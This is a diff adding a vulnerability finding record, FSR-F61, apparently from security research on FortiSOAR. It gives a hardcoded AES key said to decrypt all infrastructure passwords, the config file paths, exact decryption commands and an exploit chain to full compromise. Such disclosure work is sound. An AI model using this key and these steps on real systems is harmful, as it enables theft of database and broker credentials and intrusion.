@@ -3732,3 +3732,62 @@ FSR_F60_JWT_FORGERY_VIA_SSTI_KEY_READ = {
     "admin_uuid_discovery": "Any authenticated user (or via FSR-F52 pre-auth) can list users via GET /api/3/people to obtain admin UUIDs",
     "status": "CONFIRMED -- DAS runs as nginx (systemd file confirmed); das.ini key path confirmed; CorrectJwtEncoder validation logic confirmed from source; isExpired absent-exp behavior confirmed from source",
 }
+
+# FSR-F61: Hardcoded AES-128-CFB decryption key shared across all FortiSOAR deployments (CWE-321)
+# Source: multiple confirmed locations:
+#   - /opt/cyops-workflow/sealab/sealab/settings.py lines 179-186 (RabbitMQ/Celery broker password)
+#   - /opt/cyops-workflow/sealab/sealab/settings.py lines 350-358 (PostgreSQL DB password)
+#   - /opt/cyops-auth/utilities/ldaphandler.so (LDAP bind password)
+#   - /opt/cyops-auth/utilities/csengine.so (DB engine password)
+#   - /opt/cyops-auth/utilities/ha/common_utils.so (HA secret)
+#   - /opt/cyops-auth/utilities/ha/postgres.so (Postgres HA password)
+#   - /opt/cyops/configs/scripts/manage_passwords.py + .lib/PasswordModule.so (decryption CLI)
+#   - prod/4.12.0/upgrade_cyops_4.12.0.sh (MongoDB password)
+#   - prod/4.12.0/audit_log_migration.py (MongoDB password)
+# Key: 'jQp3(7@jod#j38d1' (16 bytes, AES-128)
+# Algorithm: AES-128-CFB (MODE_CFB from Crypto.Cipher.AES)
+# Format: base64(IV[16] + AES-128-CFB_ciphertext)
+# Usage: manage_passwords.py --decrypt <b64blob> jQp3(7@jod#j38d1
+# Affected passwords: RabbitMQ/Celery broker, PostgreSQL database, MongoDB, LDAP bind password
+# Impact: Anyone with read access to FortiSOAR config files (world-readable OR via FSR-F43 SSTI)
+#   can decrypt all infrastructure passwords using only the public key and the encrypted blobs.
+# Same key found in FortiSOAR 4.11-8.0 (confirmed in prod/ and 7.2.0 RPMs) -- not instance-generated.
+FSR_F61_HARDCODED_AES_KEY_ALL_PASSWORDS = {
+    "id": "FSR-F61",
+    "title": "Hardcoded AES-128-CFB key 'jQp3(7@jod#j38d1' decrypts ALL FortiSOAR infrastructure passwords -- RabbitMQ, PostgreSQL, MongoDB, LDAP across all deployments",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": "CWE-321",
+    "key": b"jQp3(7@jod#j38d1",
+    "key_str": "jQp3(7@jod#j38d1",
+    "algorithm": "AES-128-CFB (MODE_CFB, PyCryptodome/PyCrypto)",
+    "format": "base64(IV[16] + AES-CFB-ciphertext) -- IV prepended; no HMAC/authentication",
+    "script": "/opt/cyops/configs/scripts/manage_passwords.py --decrypt <b64blob> jQp3(7@jod#j38d1",
+    "affected_passwords": {
+        "RabbitMQ_broker": "mq_password in /opt/cyops/configs/cyops.conf -- decrypted in settings.py:180; used in CELERY_BROKER_URL",
+        "PostgreSQL_database": "pg_password in /opt/cyops/configs/cyops.conf -- decrypted in settings.py:352; used in DATABASES connection",
+        "MongoDB": "mongodb_password in FortiSOAR config -- decrypted in audit_log_migration.py",
+        "LDAP_bind": "LDAP bind password in DAS config -- decrypted in ldaphandler.so",
+        "HA_secrets": "HA cluster shared secrets -- decrypted in ha/common_utils.so and ha/postgres.so",
+    },
+    "config_file_paths": {
+        "main_config": "/opt/cyops/configs/cyops.conf (mq_*, pg_* sections)",
+        "rabbitmq_users": "/opt/cyops/configs/rabbitmq/rabbitmq_users.conf",
+        "das_ini": "/opt/cyops-auth/utilities/das.ini",
+        "workflow_settings": "/opt/cyops-workflow/sealab/sealab/settings.py (plaintext key visible here)",
+    },
+    "version_range": "FortiSOAR 4.11.0 through 8.0.0 -- key confirmed in prod/ (4.11-4.12) and 7.2.x RPMs; not instance-generated",
+    "exploit": {
+        "step1": "Read encrypted password blob from config: cat /opt/cyops/configs/cyops.conf (or via FSR-F43 SSTI readfile)",
+        "step2": "/opt/cyops-auth/.env/bin/python /opt/cyops/configs/scripts/manage_passwords.py --decrypt '<blob>' 'jQp3(7@jod#j38d1'",
+        "step3": "Or use fortinet_decrypt.py --fortisoar --blob <blob> (PasswordModule_cli key)",
+        "no_auth_required": "Config files may be readable by nginx user (same user that runs DAS and workflow services)",
+    },
+    "chains": {
+        "preauth_all_creds": "FSR-F43 SSTI (nginx) reads /opt/cyops/configs/cyops.conf -> decrypt all passwords with jQp3 key -> RabbitMQ+PostgreSQL access",
+        "database_access": "RabbitMQ password -> inject messages into broker -> trigger arbitrary workflows; PostgreSQL password -> direct DB access -> read all secrets",
+        "full_chain": "FSR-F52 + FSR-F43 + FSR-F61: pre-auth -> read config -> decrypt all infra passwords -> full infrastructure compromise",
+    },
+    "status": "CONFIRMED -- key found in multiple independent binaries and plain Python scripts; AES-128-CFB mode confirmed via __pyx_n_s_MODE_CFB in util.so and PasswordModule.so",
+}
